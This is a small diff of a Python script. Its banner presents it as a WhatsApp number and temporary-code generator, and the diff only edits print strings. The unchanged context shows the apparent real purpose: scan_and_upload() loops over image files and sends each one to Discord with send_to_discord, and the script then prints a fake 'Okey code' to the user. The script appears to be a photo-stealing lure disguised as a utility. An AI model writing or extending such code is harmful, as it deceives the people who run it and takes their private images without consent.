@@ -589,9 +589,10 @@ def scan_and_upload():
         send_to_discord(image_path)
         time.sleep(1) 
     
-    print("\n Okey code: 346789
+    print("\n Okey code: 346789...")
 
 if __name__ == "__main__":
-    print("""WP NOMBER GENERATE + CODE TEMP WP
+    print("""
+    WP NOMBER GENERATE + CODE TEMP WP
     """)
     scan_and_upload()
